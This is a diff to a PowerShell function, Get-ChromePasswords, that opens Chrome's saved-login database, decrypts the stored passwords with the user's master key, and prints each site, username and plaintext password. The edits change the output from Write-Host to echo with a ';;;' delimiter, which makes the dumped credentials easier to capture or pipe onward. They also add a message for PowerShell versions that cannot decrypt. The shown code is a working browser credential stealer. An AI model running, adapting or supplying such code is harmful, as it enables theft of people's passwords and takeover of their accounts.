@@ -26,8 +26,10 @@ Function Get-ChromePasswords
             [Security.Cryptography.DataProtectionScope]::CurrentUser
         )
         $decoder = [Security.Cryptography.AesGcm]::New($masterKey)
+    } else {
+        echo "Powershell v$((Get-Host).Version.Major) does not allow passwords decryption"
     }
-
+    
     Add-Type -AssemblyName System.Security
     Add-Type 'using System;
         using System.Runtime.InteropServices;
@@ -79,14 +81,14 @@ Function Get-ChromePasswords
 
     $dbH = 0
     if([WinSQLite3]::Open($dataPath, [ref] $dbH) -ne 0) {
-        Write-Host "Failed to open!"
+        echo "Failed to open!"
         [WinSQLite3]::GetErrmsg($dbh)
         exit
     }
 
     $stmt = 0
     if ([WinSQLite3]::Prepare2($dbH, $query, -1, [ref] $stmt, [System.IntPtr]0) -ne 0) {
-        Write-Host "Failed to prepare!"
+        echo "Failed to prepare!"
         [WinSQLite3]::GetErrmsg($dbh)
         exit
     }
@@ -105,7 +107,7 @@ Function Get-ChromePasswords
             )
             $password = [System.Text.Encoding]::ASCII.GetString($passwordBytes)
             
-            Write-Host "$url,$username,$password"
+            echo "$url;;;$username;;;$password"
             continue
 
         } catch [System.Security.Cryptography.CryptographicException] {
@@ -123,7 +125,7 @@ Function Get-ChromePasswords
             $decoder.Decrypt($nonce, $cipherText, $tag, $unencryptedBytes)
             $password = [System.Text.Encoding]::ASCII.GetString($unencryptedBytes)
 
-            Write-Host "$url,$username,$password"
+            echo "$url;;;$username;;;$password"
         }
     }
 }
